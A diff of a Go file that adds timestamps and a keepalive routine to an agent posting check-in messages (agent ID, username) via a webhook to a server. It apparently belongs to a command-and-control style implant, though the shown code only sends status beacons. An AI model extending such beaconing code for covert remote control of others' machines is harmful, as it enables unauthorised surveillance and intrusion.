@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"net/http"
 	"strings"
+	"time"
 )
 
 type CommandOutputMsg struct {
@@ -19,17 +20,26 @@ type CommandOutputMsg struct {
 }
 
 type NotifyMsg struct {
-	AgentID  string
-	Username string
-	Random   string
+	AgentID   string
+	Username  string
+	Random    string
+	Timestamp int64
+}
+
+type KeepaliveMsg struct {
+	AgentID   string
+	Username  string
+	Random    string
+	Timestamp int64
 }
 
 func (agent *Agent) notifyServer(webhookURL string, serverURL string) error {
 
 	notifyMsg := NotifyMsg{
-		Random:   random(), 
-		AgentID:  agent.agentID,
-		Username: agent.username,
+		Random:    random(),
+		AgentID:   agent.agentID,
+		Username:  agent.username,
+		Timestamp: time.Now().Unix(),
 	}
 
 	encodedResult, err := serializeAndEncodeResult(notifyMsg)
@@ -38,6 +48,32 @@ func (agent *Agent) notifyServer(webhookURL string, serverURL string) error {
 	}
 
 	bodyBytes, err := prepareWebhookPayload(encodedResult, serverURL+"hello/")
+	if err != nil {
+		return err
+	}
+
+	err = postToWebhook(bodyBytes, webhookURL)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func (agent *Agent) sendKeepalive(webhookURL string, serverURL string) error {
+	keepaliveMsg := KeepaliveMsg{
+		Random:    random(),
+		AgentID:   agent.agentID,
+		Username:  agent.username,
+		Timestamp: time.Now().Unix(),
+	}
+
+	encodedResult, err := serializeAndEncodeResult(keepaliveMsg)
+	if err != nil {
+		return err
+	}
+
+	bodyBytes, err := prepareWebhookPayload(encodedResult, serverURL+"keepalive/")
 	if err != nil {
 		return err
 	}
